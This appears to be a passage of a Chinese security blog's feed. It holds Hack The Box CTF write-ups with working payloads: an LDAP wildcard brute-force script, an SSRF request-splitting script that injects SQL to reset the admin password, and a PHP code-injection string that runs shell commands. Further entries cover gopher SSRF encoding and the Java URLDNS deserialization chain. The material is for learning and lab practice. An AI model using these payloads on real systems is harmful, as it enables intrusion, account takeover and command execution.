class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;~&#x27;</span>, <span class="hljs-string">&#x27;!&#x27;</span>, <span class="hljs-string">&#x27;@&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;%&#x27;</span>, <span class="hljs-string">&#x27;&amp;&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>])<br><br>counter = <span class="hljs-number">0</span><br>flag = <span class="hljs-string">&quot;HTB&#123;&quot;</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-comment"># 所有字符都测试了，说明找到了flag</span><br>    <span class="hljs-keyword">if</span> counter == <span class="hljs-built_in">len</span>(chars):<br>        <span class="hljs-built_in">print</span>(flag+<span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>        <span class="hljs-keyword">break</span><br><br>    password = flag + chars[counter]+<span class="hljs-string">&#x27;*&#125;&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Trying&quot;</span> + password)<br>    data = &#123;<span class="hljs-string">&quot;username&quot;</span> : <span class="hljs-string">&quot;Reese&quot;</span>, <span class="hljs-string">&quot;password&quot;</span> : password&#125;<br>    response = requests.post(url= url,headers=header,data=data)<br><br>    <span class="hljs-keyword">if</span> response.url != url+<span class="hljs-string">&quot;?message=Authentication%20failed&quot;</span>:<br>        flag += chars[counter]<br>        counter = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">else</span>:<br>        counter += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="Weather-App"><a href="#Weather-App" class="headerlink" title="Weather App"></a>Weather App</h3><p>首先下载附件，审计源码。</p><p><strong><img src="/2022/11/01/web/image-20221229123403100.png" class="" title="image-20221229123403100"></strong></p><p>可以看到在使用admin登陆时，会将flag返回</p><p>尝试登陆，密码不知道。</p><p>查看其它路由</p><img src="/2022/11/01/web/image-20221229123548852.png" class="" title="image-20221229123548852"><p>发现，有注册功能，但是，这里仅接受来自本地的请求，查看其它位置有没有利用的地方。</p><p>返现对&#x2F;api&#x2F;weather的请求中存在http请求</p><img src="/2022/11/01/web/image-20221229123746859.png" class="" title="image-20221229123746859"><p>这里需要激发额外的http请求</p><img src="/2022/11/01/web/image-20221229123922496.png" class="" title="image-20221229123922496"><p>node8对http模块很容易<a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">通过Request Splitting</a>受到<a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">SSRF的</a>攻击。</p><p>这里找到了攻击入口，尝试构造payload</p><img src="/2022/11/01/web/image-20221229124221332.png" class="" title="image-20221229124221332"><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>) <span class="hljs-keyword">ON</span> <span class="hljs-keyword">CONFLICT</span>(username) <span class="hljs-keyword">DO</span> <span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<span class="hljs-comment">--+&#x27;)</span><br></code></pre></td></tr></table></figure><p>所以构造如下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">username</span>=admin&amp;password=1234&#x27;) ON CONFLICT(username) <span class="hljs-keyword">DO</span> UPDATE <span class="hljs-built_in">SET</span> password = <span class="hljs-string">&#x27;admin&#x27;</span>;--<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><br><span class="language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/register</span> <span class="hljs-meta">HTTP/1.1</span></span><br><span class="language-http"><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1</span><br><span class="language-http"><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="language-http"><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>29</span><br><span class="language-http"></span><br><span class="language-http"><span class="language-routeros"><span class="hljs-attribute">username</span>=admin&amp;password=1234&#x27;) ON CONFLICT(username) <span class="hljs-keyword">DO</span> UPDATE <span class="hljs-built_in">SET</span> password = <span class="hljs-string">&#x27;admin&#x27;</span>;--</span></span><br><span class="language-routeros"><span class="language-http"></span></span><br><span class="language-routeros"><span class="language-http"><span class="hljs-built_in">GET</span> / HTTP/1.1</span></span><br><span class="language-routeros"><span class="language-http">Host: 127.0.0.1</span></span><br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://167.172.55.94:30182&quot;</span><br><br>username = <span class="hljs-string">&#x27;admin&#x27;</span><br>password = <span class="hljs-string">&#x27;1234\&#x27;) ON CONFLICT(username) DO UPDATE SET password = \&#x27;admin\&#x27;;--&#x27;</span><br>PARSEusername = username.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;\u0120&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;%27&quot;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;%22&quot;</span>)<br>PARSEpassword = password.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;\u0120&quot;</span>).replace(<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;%27&quot;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&quot;%22&quot;</span>)<br>contentLength = <span class="hljs-built_in">len</span>(PARSEusername)+<span class="hljs-built_in">len</span>(PARSEpassword)+<span class="hljs-number">19</span><br>endpoint = <span class="hljs-string">&#x27;127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHOST:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120&#x27;</span> + <span class="hljs-built_in">str</span>(contentLength) + <span class="hljs-string">&#x27;\u010D\u010A\u010D\u010Ausername=&#x27;</span> + PARSEusername + <span class="hljs-string">&#x27;&amp;password=&#x27;</span> + PARSEpassword + <span class="hljs-string">&#x27;\u010D\u010A\u010D\u010AGET\u0120/?lol=&#x27;</span><br>r = requests.post(url + <span class="hljs-string">&#x27;/api/weather&#x27;</span>, json=&#123;<span class="hljs-string">&#x27;endpoint&#x27;</span>: endpoint, <span class="hljs-string">&#x27;city&#x27;</span>: <span class="hljs-string">&#x27;chengdu&#x27;</span>, <span class="hljs-string">&#x27;country&#x27;</span>: <span class="hljs-string">&#x27;CN&#x27;</span>&#125;)<br><span class="hljs-built_in">print</span>(r)<br></code></pre></td></tr></table></figure><h3 id="LoveTok"><a href="#LoveTok" class="headerlink" title="LoveTok"></a>LoveTok</h3><p>审计源码，找到调用链</p><img src="/2022/11/01/web/image-20221229173947869.png" class="" title="image-20221229173947869"><img src="/2022/11/01/web/image-20221229174010675.png" class="" title="image-20221229174010675"><img src="/2022/11/01/web/image-20221229174053042.png" class="" title="image-20221229174053042"><img src="/2022/11/01/web/image-20221229174123918.png" class="" title="image-20221229174123918"><p>由此，找到调用链</p><img src="/2022/11/01/web/image-20221229174216675.png" class="" title="image-20221229174216675"><p>过滤处理</p><p>addslashes ( string <code>$str</code> ) : string</p><p>返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（*’<em>）、双引号（</em>“<em>）、反斜线（\）与 NUL（</em><em><code>NULL</code></em>* 字符）。</p><p>绕过该函数</p><p><a href="https://www.programmersought.com/article/30723400042/">https://www.programmersought.com/article/30723400042/</a></p><p>即</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">format</span>=$&#123;<span class="hljs-keyword">system</span>($_GET[<span class="hljs-number">1</span>])&#125;&amp;<span class="hljs-number">1</span>=<span class="hljs-keyword">ls</span>+/<br></code></pre></td></tr></table></figure><img src="/2022/11/01/web/image-20221229174757729.png" class="" title="image-20221229174757729"><img src="/2022/11/01/web/image-20221229174827479.png" class="" title="image-20221229174827479"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?format=<span class="hljs-variable">$&#123;system($_GET[1])&#125;</span>&amp;1=<span class="hljs-built_in">cat</span>+/flagD1wvH<br></code></pre></td></tr></table></figure><p><strong>HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}</strong></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LDAP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>经典加密算法的实现与破解--凯撒</title>
    <link href="/2022/10/11/%E7%BB%8F%E5%85%B8%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%A0%B4%E8%A7%A3-%E5%87%AF%E6%92%92/"/>
    <url>/2022/10/11/%E7%BB%8F%E5%85%B8%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%A0%B4%E8%A7%A3-%E5%87%AF%E6%92%92/</url>
    
    <content type="html"><![CDATA[<h1 id="凯撒密码加解密实现及暴力破解"><a href="#凯撒密码加解密实现及暴力破解" class="headerlink" title="凯撒密码加解密实现及暴力破解"></a>凯撒密码加解密实现及暴力破解</h1><h2 id="凯撒密码简介"><a href="#凯撒密码简介" class="headerlink" title="凯撒密码简介"></a>凯撒密码简介</h2><p>密钥为k，即将字母表对应关系改为a &#x3D;&#x3D; ?+k%26 也即<img src="/2022/10/11/%E7%BB%8F%E5%85%B8%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E7%A0%B4%E8%A7%A3-%E5%87%AF%E6%92%92/1620.png" class="" title="img"></p><p>解密则将对应关系左移</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">encry</span><span class="hljs-params">(plain <span class="hljs-type">string</span>, k <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">string</span> &#123;<br><span class="hljs-comment">// 转化为小写字母</span><br>plainL := strings.ToLower(plain)<br><span class="hljs-comment">// 获取明文切片</span><br>ciphertextlice := []<span class="hljs-type">byte</span>(plainL)<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(ciphertextlice); i++ &#123;<br><span class="hljs-keyword">if</span> ciphertextlice[i] &lt; <span class="hljs-type">byte</span>(<span class="hljs-number">123</span>-k) &#123;<br>ciphertextlice[i] = ciphertextlice[i] + <span class="hljs-type">byte</span>(k)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>ciphertextlice[i] = ciphertextlice[i] + <span class="hljs-type">byte</span>(k) - <span class="hljs-number">26</span><br>&#125;<br>&#125;<br>fmt.Println(<span class="hljs-type">string</span>(ciphertextlice))<br><span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(ciphertextlice)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">deencry</span><span class="hljs-params">(ciper <span class="hljs-type">string</span>, k <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">string</span> &#123;<br>ciperL := strings.ToLower(ciper)<br>plain := []<span class="hljs-type">byte</span>(ciperL)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(plain); i++ &#123;<br><span class="hljs-keyword">if</span> plain[i] &gt; <span class="hljs-type">byte</span>(<span class="hljs-number">96</span>+k) &#123;<br>plain[i] = plain[i] - <span class="hljs-type">byte</span>(k)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>plain[i] = plain[i] - <span class="hljs-type">byte</span>(k) + <span class="hljs-number">26</span><br>&#125;<br>&#125;<br>fmt.Println(<span class="hljs-type">string</span>(plain))<br><span class="hljs-keyword">return</span> <span class="hljs-type">string</span>(plain)<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">bruteforce</span><span class="hljs-params">(ciper <span class="hljs-type">string</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">26</span>; i++ &#123;<br>deencry(ciper, i)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> plain <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> k <span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> ciper <span class="hljs-type">string</span><br><span class="hljs-keyword">var</span> dk <span class="hljs-type">int</span><br>fmt.Println(<span class="hljs-string">&quot;加密操作，输入明文 密钥&quot;</span>)<br>fmt.Scanln(&amp;plain, &amp;k)<br>encry(plain, k)<br>fmt.Println(<span class="hljs-string">&quot;解密操作，输入密文 密钥&quot;</span>)<br>fmt.Scanln(&amp;ciper, &amp;dk)<br>deencry(ciper, dk)<br>fmt.Println(<span class="hljs-string">&quot;暴力破解，只需输入密文&quot;</span>)<br>fmt.Scanln(&amp;ciper)<br>bruteforce(ciper)<br>&#125;<br></code></pre></td></tr></table></figure><p>暴力破解需要在众多解密明文中寻找有意义的明文</p>]]></content>
    
    
    <categories>
      
      <category>信息系统安全实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gopher协议</title>
    <link href="/2022/10/09/gopher%E5%8D%8F%E8%AE%AE/"/>
    <url>/2022/10/09/gopher%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h1><h2 id="协议简介"><a href="#协议简介" class="headerlink" title="协议简介"></a>协议简介</h2><p>gopher应用于http协议之前，用于访问internet，虽然很古老，但是目前很多库还在支持gopher协议，并且gopher协议很强大。<br>可以实现多数据包整合发送 ，然后gopher服务端家安多个数据包昆巴昂着发送到客户端，这就是他的菜单响应。<br>gopher协议使用tcp建立可靠连接。</p><h2 id="协议格式"><a href="#协议格式" class="headerlink" title="协议格式"></a>协议格式</h2><p>gopher协议格式为</p><p><code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></p><p><port>默认为70</p><p>**<gopher-paath>**其中<gopher-path>格式可以是如下的一种</p><figure class="highlight bnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bnf"><span class="hljs-attribute">&lt;gophertype&gt;</span><span class="hljs-attribute">&lt;selector&gt;</span><br><span class="hljs-attribute">&lt;gophertype&gt;</span><span class="hljs-attribute">&lt;selector&gt;</span>%09<span class="hljs-attribute">&lt;search&gt;</span><br><span class="hljs-attribute">&lt;gophertype&gt;</span><span class="hljs-attribute">&lt;selector&gt;</span>%09<span class="hljs-attribute">&lt;search&gt;</span>%09<span class="hljs-attribute">&lt;gopher+_string&gt;</span><br></code></pre></td></tr></table></figure><p>整个<code>&lt;gopher-path&gt;</code>部分可以省略，这时候<code>\</code>也可以省略<code>&lt;gophertype&gt;</code>为默认的1。<br><code>&lt;gophertype&gt;</code>是一个单字符用来表示url 资源的类型，在常用的安全测试中发现不管这个字符是什么都不影响，只要有就行了。<br><code>&lt;selector&gt;</code>个人理解这个是包的内容，为了避免一些特殊符号需要进行url 编码，但如果直接把wireshark 中ascii 编码的数据直接进行url 编码然后丢到gopher 协议里跑会出错，得在wireshark 里先换成hex 编码的原始数据后再每两个字符的加上<code>%</code>，通过对比发现直接url 编码的话会少了<code>%0d</code>回车字符。<br><code>&lt;search&gt;</code>用于向gopher 搜索引擎提交搜索数据，和<code>&lt;selector&gt;</code>之间用<code>%09</code>隔开。<br><code>&lt;gopher+_string&gt;</code>是获取gopher+ 项所需的信息，gopher+ 是gopher 协议的升级版。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    cansshu = <span class="hljs-string">&quot;&quot;&quot;POST /?a=1 HTTP/1.1</span><br><span class="hljs-string">Host: 172.73.23.100:80</span><br><span class="hljs-string">Content-Length: 3</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">X-Forwarded-For:127.0.0.1</span><br><span class="hljs-string">Referer: bolean.club</span><br><span class="hljs-string"></span><br><span class="hljs-string">b=1&quot;&quot;&quot;</span><br>    cansshu = urllib.parse.quote(cansshu)<br>    cansshu.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    cansshu = urllib.parse.quote(cansshu)<br>    <span class="hljs-built_in">print</span>(cansshu)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gopher</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化</title>
    <link href="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h1><p>前几个月，跟着很多师傅在网上写的java反序列化博客学习。但直到今天，我对java反序列化没有一个清晰的认识。所以我计划从ysoserial源码的角度逐步探索gadget，理解反序列化，所以下文将是我思考的思路。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境搭建选择<a href="https://tttang.com/archive/1337/#toc_transformedmap:~:text=%E5%9C%A8%E5%AD%A6%E4%B9%A0Commons%20Collection%E5%88%A9%E7%94%A8%E9%93%BE%E4%B9%8B%E5%89%8D%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E5%85%88%E6%90%AD%E5%BB%BA%E5%A5%BD%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%EF%BC%8C%E7%AC%AC%E4%B8%80%E6%AD%A5%E5%B0%B1%E6%98%AF%E5%AE%89%E8%A3%85JDK%E5%92%8Cmaven%E4%BA%86%E8%BF%99%E9%87%8C%E6%88%91%E6%8E%A8%E8%8D%90%E5%A4%9A%E5%AE%89%E8%A3%85%E5%A4%9A%E5%87%A0%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84JDK%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9C%89%E7%9A%84%E5%88%A9%E7%94%A8%E4%BC%9A%E6%9C%89%E7%89%88%E6%9C%AC%E7%9A%84%E9%99%90%E5%88%B6%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8%E5%88%86%E6%9E%90%E8%BF%99%E4%BA%9B%E5%88%A9%E7%94%A8%E9%93%BE%E6%98%AF%E9%9C%80%E8%A6%81%E5%88%87%E6%8D%A2%E6%8C%87%E5%AE%9A%E7%9A%84JDK%E3%80%82%E5%AE%89%E8%A3%85%E5%A5%BDJDK%E5%92%8Cmaven%E5%90%8E%E9%9C%80%E8%A6%81%E9%85%8D%E7%BD%AE%E5%A5%BDidea%E7%9A%84%E7%8E%AF%E5%A2%83%EF%BC%8C%E7%84%B6%E5%90%8E%E9%9C%80%E8%A6%81%E5%85%8B%E9%9A%86ysoserial%E7%9A%84%E6%BA%90%E7%A0%81%E4%B8%8B%E6%9D%A5%EF%BC%8C%E4%B9%8B%E5%90%8E%E7%9A%84%E8%B0%83%E8%AF%95%E6%88%91%E4%BB%AC%E4%BC%9A%E5%9C%A8ysoserial%E7%9A%84%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%9B%E8%A1%8C%EF%BC%8C%E5%9B%A0%E4%B8%BAysoserial%E4%B8%AD%E9%85%8D%E5%A5%BD%E4%BA%86%E6%88%91%E4%BB%AC%E6%89%80%E9%9C%80%E8%A6%81%E7%9A%84%E5%BA%93%E7%8E%AF%E5%A2%83%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AA%E9%9C%80%E8%A6%81%E5%88%A9%E7%94%A8maven%E5%B0%86%E5%90%84%E7%A7%8D%E5%8C%85%E5%AF%BC%E5%85%A5%E5%8D%B3%E5%8F%AF%E3%80%82%E6%9C%80%E5%90%8E%E5%B0%B1%E6%98%AF%E5%9C%A8%E9%A1%B9%E7%9B%AE%E4%B8%AD%E5%88%9B%E5%BB%BA%E5%A5%BD%E6%88%91%E4%BB%AC%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6%E5%A4%B9%E3%80%82">lsf师傅的方法</a>采用ysoserial源码加IDEA</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905083110004.png" class="" title="image-20220905083110004"><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>首先分析的是p神推荐的比较简单的反序列化链进行分析。</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905083308473.png" class="" title="image-20220905083308473"><p>注释部分进行了简要的介绍，通过阅读注释理解了URL.hashCode()会进行DNS查询</p><p>根据给出的Gadget，首先找到HashMap</p><p>代码的里就有HashMap，代码里面的注释同样包含了大量的信息，先放着不谈，我们先跟进一下Gadget</p><p>本来的思路是从上到下跟进，但是发现这样不太好理解，所以尝试从URL.hashCode()向上分析</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905084500134.png" class="" title="image-20220905084500134"><blockquote><p> synchronized:synchronized可以保证方法或者代码块在运行时，同一时刻只有一个方法可以进入到临界区，同时它还可以保证共享变量的<a href="https://so.csdn.net/so/search?q=%E5%86%85%E5%AD%98&spm=1001.2101.3001.7020">内存</a>可见性，Java中每一个对象都可以作为锁，这是synchronized实现同步的基础。</p></blockquote><p>hashCode&#x3D;&#x3D;-1也就是URL类所设置的初始值时，会触发handler.hashCode</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905085047025.png" class="" title="image-20220905085047025"><blockquote><p>java 的transient关键字为我们提供了便利，你只需要实现Serilizable接口，将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。</p></blockquote><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905085530659.png" class="" title="image-20220905085530659"><p>handler在构造方法中的赋值方法</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905085914649.png" class="" title="image-20220905085914649"><p>protocol可控，跟进getURLStreamHandler</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905090444053.png" class="" title="image-20220905090444053"><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905090550576.png" class="" title="image-20220905090550576"><p>跟进Hashtable的get方法</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905090640924.png" class="" title="image-20220905090640924"><p>这里的protocol传进来，这里就没什么好看的了，根据key获取值</p><p>所以URLStreamHandler就是根据protocol获取其工厂类，由于我对java网络的不了解这里跟进了一下，对URLDNS链并没有帮助</p><p>回到handler.hashCode也就是URLStreamHandler.hashCode</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905091509035.png" class="" title="image-20220905091509035"><p>u参数就是URL对象</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905091713053.png" class="" title="image-20220905091713053"><p>这里就好理解了，根据host获取IP地址，也就是DNS查询，host在构造方法中可控且支持序列化</p><p>至此，我们知道了URL.hashCode会进行一次DNS查询</p><p>那么如何引发这个方法呢？</p><p>回到Gadget,HashMap.hash()</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905092505662.png" class="" title="image-20220905092505662"><p>他的hash方法会调用key.hashCode,那么思路就清晰了，key&#x3D;URL就可以了，那我们就跟进HashMap.put(URL)</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905092730610.png" class="" title="image-20220905092730610"><p>put时也调用了hash方法，那么下面就去看readObeject</p><img src="/2022/10/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220905093225487.png" class="" title="image-20220905093225487"><p>在readObject方法中调用了put方法</p><p>自此，</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">*   Gadget Chain:<span class="hljs-operator"></span><br><span class="hljs-operator">*     </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-operator"></span><br><span class="hljs-operator">*       </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><span class="hljs-operator"></span><br><span class="hljs-operator">*         </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">*           </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br></code></pre></td></tr></table></figure><p>分析完成。</p><p>那么我们下面理解一下代码</p><p>ysosrial中存在URL u &#x3D; new URL(null, url, handler);</p><p>handler存在其目的是避免本地构造是进行DNS查询，由于这个变量不会进行序列化所以不会有影响。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); 